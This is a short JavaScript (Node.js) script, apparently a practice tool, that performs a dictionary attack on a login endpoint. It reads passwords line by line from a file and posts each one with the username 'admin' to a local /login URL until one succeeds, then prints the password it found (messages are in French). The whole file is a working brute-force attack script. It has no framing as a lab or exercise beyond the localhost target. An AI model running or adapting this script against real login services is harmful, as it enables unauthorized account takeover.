const fs = require('node:fs/promises');

const PASSWORD_FILE = "./passwords.txt";
const API_URL = "http://localhost:3000/login";

async function main() {
    try {
        await fs.access(PASSWORD_FILE, fs.constants.R_OK);
        const bufferedData = await fs.readFile(PASSWORD_FILE);
        const dataString = bufferedData.toString();
        const passwords = dataString.split(/\n/);
        for (let password of passwords) {
            const response = await fetch(API_URL, {
                method: "POST",
                body: JSON.stringify({ username: 'admin', password }),
                headers: {
                    "Content-Type": "application/json"
                }
            });
            if (response.ok) {
                const responseData = await response.json();
                if (responseData.success) {
                    console.log("Mot de passe trouvé :", password);
                    break;
                }
            }
            console.log(password, "X");
        }
    } catch (error) {
        console.error(error.message);
    }
}

main();